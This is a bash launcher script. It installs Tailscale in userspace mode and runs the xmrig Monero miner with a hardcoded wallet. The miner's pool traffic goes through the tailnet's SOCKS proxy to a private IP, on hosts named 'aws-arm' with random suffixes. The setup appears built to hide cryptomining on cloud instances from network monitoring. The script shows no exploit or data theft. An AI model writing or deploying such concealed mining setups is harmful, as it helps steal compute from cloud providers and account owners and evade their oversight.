#!/bin/bash
TS_KEY="${TS_KEY:-$1}"
if [ -z "$TS_KEY" ]; then
    echo "ERROR: No Tailscale Auth Key provided!"
    echo "Usage: TS_KEY='tskey-auth-...' ./start.sh"
    exit 1
fi

DOCKER_PROXY_IP="100.65.155.105" 
WALLET="85RcBrmqpB2TboWNtPUEzTLR5QVqZSiTPdq1fTiGdwvmC5E2rUzovKqArdYToBEZWz3qxthgoi2n41SJHJPN9amC9HCQbk8"

if [ ! -f "./tailscale" ]; then
    echo "Downloading Tailscale for ARM64..."
    wget -q https://pkgs.tailscale.com/stable/tailscale_latest_arm64.tgz
    tar xzf tailscale_latest_arm64.tgz --strip-components=1
    chmod +x tailscale tailscaled
fi

pkill -f tailscaled
rm -f ts.state ts.sock

echo "Starting Tailscale in Userspace Mode..."
./tailscaled --tun=userspace-networking --socket=ts.sock --state=ts.state --socks5-server=localhost:1055 &
sleep 5

echo "Connecting to Tailnet..."

./tailscale --socket=ts.sock up --authkey="$TS_KEY" --hostname="aws-arm-$RANDOM" --accept-dns=false

echo "Launching Miner..."

./xmrig-aarch64-static \
  -c config.json \
  -o "$DOCKER_PROXY_IP:9999" \
  -u "$WALLET" \
  --proxy "127.0.0.1:1055" \
  --no-tls \
  --rig-id "aws-$(hostname)"
